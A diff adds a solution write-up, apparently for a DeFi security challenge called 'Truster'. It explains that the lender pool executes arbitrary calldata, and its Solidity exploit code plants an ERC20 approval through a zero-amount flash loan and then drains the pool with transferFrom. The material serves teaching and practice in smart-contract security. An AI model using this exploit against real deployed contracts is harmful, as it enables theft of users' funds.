@@ -157,9 +157,40 @@ assertEq(token.balanceOf(address(pool)), 0);
 
 ### Solution
 
-???
+Notice that `TrusterLenderPool.flashLoan` executes any function at _any target_ for you
+
+```solidity
+target.functionCall(data);
+```
+
+We set an approval to receive all the tokens after we perform a flash loan then
+
+```solidity
+// tell the pool in the custom function to approve a transfer to us
+bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);
+```
+
+One question during the analysis of this problem was "_But then, how do we give the funds back to the loan, while we plant the approval?_". Fortunately,
+
+1. the pool doesn't control for loans of `0` tokens nor charge fees, so we don't need to equip a mechanism to give funds back.
+2. ERC20's `transfer` doesn't fail when the `amount` is 0.
+
+We issue the flash loan of 0, and then take the funds.
+
+```solidity
+// the pool doesn't control for a loan of 0 tokens, nor charges a fee.
+// hence, we don't need to prepare a callback to give it funds back.
+pool.flashLoan(
+  0,
+  address(this),
+  address(token),
+  data
+);
+
+// with our approval planted, we just take the funds
+token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
+```
 
 ### Reference
 
 * https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-
-* https://eips.ethereum.org/EIPS/eip-3156
